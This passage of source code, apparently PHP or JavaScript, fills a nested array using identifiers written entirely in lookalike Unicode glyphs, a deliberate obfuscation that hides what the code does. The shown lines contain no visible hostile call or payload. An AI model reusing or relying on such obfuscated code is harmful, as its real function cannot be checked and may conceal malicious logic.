			ⵠⲆ[Ⲇ.ⵠΔΔⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔΔⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔΔⲆΔΔⵠ;
			ⵠⲆ[Ⲇ.ⵠΔΔⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠᐃⵠᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠⲆⲆᐃᐃΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔΔⲆⵠΔᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔⲆᐃⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⵠⵠⵠⵠΔⵠ;
			ⵠⲆ[Ⲇ.ΔⵠΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⵠΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⲆⲆⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⵠΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃΔⲆⵠⲆΔΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠᐃΔ] = ⲆΔ.ᐃᐃΔΔⵠᐃΔ;
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆΔⵠⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠΔⵠⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔᐃΔᐃᐃΔ;
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃⵠⲆⲆΔⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆΔⲆⲆ] = ⲆΔ.ᐃⵠᐃⲆΔⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆᐃΔⲆ] = ⲆΔ.ⵠᐃᐃⲆᐃΔⲆ;
			ⵠⲆ[Ⲇ.ᐃΔΔᐃΔⲆⲆ] = ⲆΔ.ᐃΔΔᐃΔⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⵠΔᐃᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃΔᐃᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⵠΔᐃᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔᐃᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⲆΔⲆΔΔ;
			ⵠⲆ[Ⲇ.ⵠΔⵠΔᐃᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⵠⲆΔⲆΔⵠ;
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠⲆⵠΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔⲆΔᐃΔᐃ;
			ⵠⲆ[Ⲇ.ᐃΔⲆΔⲆΔⵠ] = ⲆΔ.ᐃΔⲆΔⲆΔⵠ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆⵠᐃΔ] = ⲆΔ.ᐃᐃΔⲆⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠⲆᐃⵠ] = ⲆΔ.ⲆⵠᐃⵠⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃΔⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔᐃΔⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠΔⲆⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃΔⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⵠΔᐃᐃΔ;
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠᐃⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃⲆⵠΔᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠᐃⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⵠⲆᐃΔΔΔ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔΔᐃⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⵠᐃᐃᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔᐃⲆᐃΔΔ;
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⲆⵠⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔΔᐃⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃⲆⲆΔⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⲆᐃⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⲆⵠᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠⵠᐃⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔΔᐃⲆᐃΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔⲆⵠᐃⵠ] = ⲆΔ.ΔⲆΔⲆⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆⵠᐃⲆᐃ] = ⲆΔ.ⵠⲆⲆⵠᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃΔⲆⲆⵠΔ] = ⲆΔ.ⲆᐃΔⲆⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃΔⵠᐃ] = ⲆΔ.ⲆⲆⲆᐃΔⵠᐃ;
			ⵠⲆ[Ⲇ.ΔⲆΔᐃΔⲆⲆ] = ⲆΔ.ΔⲆΔᐃΔⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠΔⵠ] = ⲆΔ.ⲆᐃᐃΔⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠΔⲆΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⲆⵠⵠΔΔ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠΔⲆΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠΔⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠⲆⵠⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃᐃΔⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⲆΔⵠⲆᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⲆⵠΔᐃⲆⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⵠΔᐃΔᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃΔᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔⲆⲆⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ⵠΔᐃΔᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠΔⵠⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃΔΔΔΔⵠⵠ] = ⲆΔ.ᐃΔΔΔΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⵠᐃᐃ] = ⲆΔ.ⲆΔᐃⲆⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠΔᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⵠⵠⵠᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠΔᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠΔⵠᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃΔᐃᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠⵠΔᐃᐃΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔᐃⲆⵠΔΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃΔΔᐃΔᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠⲆᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ΔΔⵠⲆᐃΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆΔⵠΔⵠᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠⲆᐃΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆΔⵠᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⲆΔᐃΔΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔΔᐃⲆΔΔ;
			ⵠⲆ[Ⲇ.ΔⵠⵠⲆⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⵠⲆⵠᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠᐃΔⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ΔⵠⵠⲆⵠᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⲆⲆⲆⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ΔΔΔⵠⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔⵠⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆΔᐃΔΔⵠΔ;
			ⵠⲆ[Ⲇ.ΔΔΔⵠⲆᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃΔⲆⵠΔᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃΔⵠᐃΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃΔⵠᐃΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆᐃᐃᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃΔⵠᐃΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃᐃⲆΔᐃΔ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⵠⵠΔΔΔ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⵠΔᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⲆᐃΔ] = ⲆΔ.ⲆᐃⲆⲆⲆᐃΔ;
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠᐃⵠᐃ] = ⲆΔ.ΔⲆⲆⵠᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔⲆ] = ⲆΔ.ᐃⵠⲆᐃⲆΔⲆ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔᐃᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆⲆⵠᐃΔΔ;
			ⵠⲆ[Ⲇ.ΔΔΔᐃᐃⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⵠᐃΔⲆΔ;
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠⵠᐃⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⲆⵠⵠΔᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆᐃᐃⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠΔΔΔΔ;
			ⵠⲆ[Ⲇ.ΔᐃⲆⲆᐃΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆⲆᐃΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠᐃⲆⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ΔᐃⲆⲆᐃΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔΔⵠⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ΔⵠⵠⵠᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⵠⵠᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⲆⵠᐃᐃΔ;
			ⵠⲆ[Ⲇ.ΔⵠⵠⵠᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔᐃⲆᐃⵠΔ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆᐃΔΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃⲆᐃΔΔΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔⵠᐃΔⲆΔ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆᐃΔΔΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃΔⲆᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔΔⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ΔᐃΔΔⵠΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆΔᐃⵠΔᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔΔⵠΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠⲆᐃⵠᐃΔ;
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠⵠⲆⲆΔᐃ;
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆⲆᐃΔΔⵠ;
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃⲆⲆⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃⲆⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⲆⵠΔΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔΔᐃ] = ⲆΔ.ⵠⵠΔⵠΔΔᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔΔⵠ] = ⲆΔ.ⵠᐃⲆΔΔΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⵠΔᐃ] = ⲆΔ.ⵠⲆᐃⵠⵠΔᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔᐃⲆⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃΔΔⲆⵠΔ;
			ⵠⲆ[Ⲇ.ΔΔΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⲆⲆⲆΔⵠ;
			ⵠⲆ[Ⲇ.ΔΔΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⲆᐃⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ΔⵠΔⵠᐃⲆⲆ] = ⲆΔ.ΔⵠΔⵠᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ΔΔᐃⵠΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔᐃⵠΔⲆΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆⵠⵠⵠᐃΔ;
			ⵠⲆ[Ⲇ.ΔΔᐃⵠΔⲆΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠΔⲆΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠⲆᐃⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⵠᐃⵠⵠΔΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔᐃⲆⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆΔᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠⵠⲆⵠⲆΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠᐃΔⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⵠᐃᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔᐃᐃΔΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆⲆⵠⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⵠⲆⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃΔᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠᐃΔⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ΔΔⲆⵠᐃᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆⵠᐃᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔᐃᐃᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ΔΔⲆⵠᐃᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠΔᐃⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⵠⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⵠⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃΔᐃᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⵠⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠⲆⲆⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆⲆΔⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆⲆΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃΔᐃⲆᐃΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆⲆΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃᐃⲆΔᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃΔᐃᐃ] = ⲆΔ.ⲆⲆⲆᐃΔᐃᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔᐃΔⵠᐃ] = ⲆΔ.ΔᐃΔᐃΔⵠᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⲆⵠΔ] = ⲆΔ.ⵠᐃᐃΔⲆⵠΔ;
			ⵠⲆ[Ⲇ.ΔΔⲆΔⵠⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔⵠⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔⵠⵠⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ΔΔⲆΔⵠⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⲆΔⵠⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃΔⵠΔⵠᐃ;
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⲆΔΔⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠΔᐃⲆ] = ⲆΔ.ᐃⵠⲆⵠΔᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠᐃΔⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠᐃᐃᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⲆⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃᐃⲆⲆΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⲆⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⲆΔΔⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃⲆΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⵠⵠⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃⲆΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠᐃᐃᐃΔΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠΔᐃⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⲆⵠⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠΔᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⵠᐃΔᐃᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠΔᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.Δⵠᐃᐃᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔⲆΔΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆΔⲆΔΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠΔⵠⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔⲆΔΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔᐃⵠᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆΔⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠᐃΔⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆΔⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⵠᐃᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆΔΔΔⲆΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⵠⵠⲆⲆΔΔ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃΔΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃΔΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆᐃⲆᐃΔⲆΔ;
			ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃΔΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃΔⵠΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠᐃⵠ] = ⲆΔ.ⲆᐃⵠΔⵠᐃⵠ;
